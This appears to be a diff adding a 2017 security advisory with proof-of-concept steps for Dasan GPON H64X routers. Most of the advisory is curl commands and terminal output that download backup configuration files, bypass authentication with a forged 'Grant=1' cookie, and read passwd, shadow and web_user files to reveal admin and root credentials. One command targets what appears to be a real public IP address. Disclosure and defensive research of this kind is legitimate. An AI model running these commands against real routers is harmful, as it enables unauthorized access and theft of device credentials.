@@ -1,0 +1,140 @@
+Dasan Networks GPON ONT WiFi Router H64X Series System Config Download
+
+
+Vendor: Dasan Networks
+Product web page: http://www.dasannetworks.com | http://www.dasannetworks.eu
+Affected version: Models: H640GR-02
+                          H640GV-03
+                          H640GW-02
+                          H640RW-02
+                          H645G
+                Firmware: 3.02p2-1141
+                          2.77p1-1125
+                          2.77-1115
+                          2.76-9999
+                          2.76-1101
+                          2.67-1070
+                          2.45-1045
+
+Versions 3.03x are not affected by this issue. 
+The running.CFG/wifi.CFG backup files are now 7z password protected.
+
+
+Summary: H64xx is comprised of one G-PON uplink port and four ports
+of Gigabit Ethernet downlink supporting 10/100/1000Base-T (RJ45). It
+helps service providers to extend their core optical network all the
+way to their subscribers, eliminating bandwidth bottlenecks in the
+last mile. H64xx is integrated device that provide the high quality
+Internet, telephony service (VoIP) and IPTV or OTT content for home
+or office. H64xx enable the subscribers to make a phone call whose
+quality is equal to PSTN at competitive price, and enjoy the high
+quality resolution live video and service such as VoD or High Speed
+Internet.
+
+Desc: The system backup configuration file 'running.CFG' and the wireless
+backup configuration file 'wifi.CFG' can be downloaded by an attacker
+from the root directory in certain circumstances. This will enable the
+attacker to disclose sensitive information and help her in authentication
+bypass, privilege escalation and/or full system access.
+
+Tested on: Server: lighttpd/1.4.31
+           Server: DasanNetwork Solution
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5424
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5424.php
+
+
+19.05.2017
+
+--
+
+
+-------------------
+#1 This PoC request is assuming that the admin or a user created a backup. This is done by first issuing a request
+to: /cgi-bin/backuprecoversystembackup_action.cgi or /cgi-bin/backuprecoverwifibackup_action.cgi scripts that
+instructs the web server to generate the running.CFG or wifi.CFG gziped files respectively.
+
+
+curl http://192.168.0.1/running.CFG -# | gunzip > dasan_output.txt ; strings dasan_output.txt | grep -rn 'admin:'
+######################################################################## 100.0%
+(standard input):180:admin:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:0:0:admin:/etc:/bin/sh
+(standard input):1442:admin:admin123:2
+
+bash-4.4$ curl http://192.168.0.1/running.CFG -# | gunzip > dasan_output.txt ; strings dasan_output.txt | grep -rn 'root:'
+######################################################################## 100.0%
+(standard input):181:root:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:0:0:root:/etc:/bin/sh
+(standard input):191:root:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:14987:0:99999:7:::
+bash-4.4$ 
+
+Notice the same hard-coded shell credentials for admin and root user.
+Left for the viewer to exercise 'cracking the perimeter'. ;]
+
+-------------------
+#2 This PoC request will do an authentication bypass using the Grant cookie to create the running.CFG file.
+In this request we're using Grant=1 with the account 'user' which by default has the password: user. After that,
+decompressing the file, navigating to 'etc' extracted directory and reading 'web_user' file which can then
+escalate privileges by reading the admin password and loggin-in.
+
+
+bash-4.4$ curl http://192.168.0.1/cgi-bin/backuprecoversystembackup_action.cgi --cookie "silverheader=0c; Grant=1; Language=english" -H "X-Requested-With: XMLHttpRequest" ; sleep 5
+bash-4.4$ curl http://192.168.0.1/running.CFG -vv --cookie "silverheader=0c; Grant=1; Language=english" -O
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.0.1...
+* TCP_NODELAY set
+* Connected to 192.168.0.1 (192.168.0.1) port 80 (#0)
+> GET /running.CFG HTTP/1.1
+> Host: 192.168.0.1
+> User-Agent: curl/7.51.0
+> Accept: */*
+> Cookie: silverheader=0c; Grant=1; Language=english
+> 
+< HTTP/1.1 200 OK
+< Content-Type: application/octet-stream
+< Accept-Ranges: bytes
+< ETag: "2477069903"
+< Last-Modified: Wed, 12 Jul 2017 19:14:18 GMT
+< Content-Length: 10467
+< Date: Thu, 13 Jul 2017 00:56:14 GMT
+< Server: lighttpd/1.4.31
+< 
+{ [1208 bytes data]
+ 53 10467   53  5528    0     0   5974      0  0:00:01 --:--:--  0:00:01  5969* Curl_http_done: called premature == 0
+100 10467  100 10467    0     0  11290      0 --:--:-- --:--:-- --:--:-- 11279
+* Connection #0 to host 192.168.0.1 left intact
+bash-4.4$ file running.CFG
+running.CFG: gzip compressed data, last modified: Wed Jul 12 19:12:36 2017, max compression, from Unix
+bash-4.4$ gunzip -v -d --suffix .CFG running.CFG ; tar -xf running ; cd etc ; cat web_user                  
+running.CFG:     85.6% -- replaced with running
+admin:admin123:2
+user:user:1
+bash-4.4$ 
+
+Or just:
+
+bash-4.4$ curl -O http://180.148.2.139/running.CFG
+bash-4.4$ tar -zxf running.CFG
+bash-4.4$ cd etc
+bash-4.4$ ls
+INPUT_FILTER.conf                    fire_wall.conf                       lan_static_ip.conf                   ntp.conf                             radvd_param.conf                     upnpigd.conf
+INPUT_REMOTE_ACCESS.conf             fire_wall.sh                         lighttpd.conf                        other_security_status.sh             remote_mgmt.conf                     user_ipv6tables.conf
+dasan_output.txt                     hostname                             localtime                            passwd                               routing_entry.conf                   user_wan_cfg.conf
+dhcp_client_dns.sh                   inet_check_file                      mac_filter.conf                      port_forward.conf                    shadow                               wan_ppp_mode.conf
+dhcp_client_dynamic_default_dns.conf ipupdate.conf                        mac_source_match.conf                port_forward.sh                      snmp                                 web-enable
+dhcpv6d.conf                         ipv6_route.conf                      multi_language.conf                  port_forward_dnat.sh                 snmp_status.conf                     web_user
+dhcpv6d_param.conf                   is_safe_nat_option                   nat_route.conf                       port_forward_gre.sh                  sys_login_max_num                    webrefreshtime.conf
+dmz.conf                             lan_dhcp_model.sh                    net_rest.conf                        ppp                                  syslog.confx                         websesstime.conf
+ds_mode_config                       lan_dhcp_server_static_ip.conf       ns_ftp.conf                          radvd.conf                           udhcpd.conf
+bash-4.4$ cat web_user
+admin:admin123:2
+user:user:1
+bash-4.4$ cat ./.config/ds_user_pw
+admin
+bash-4.4$ cat passwd
+admin:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:0:0:admin:/etc:/bin/sh
+root:$1$s8UHZ.Iz$B4fSbmqgPsm717yQsFNfD/:0:0:root:/etc:/bin/sh
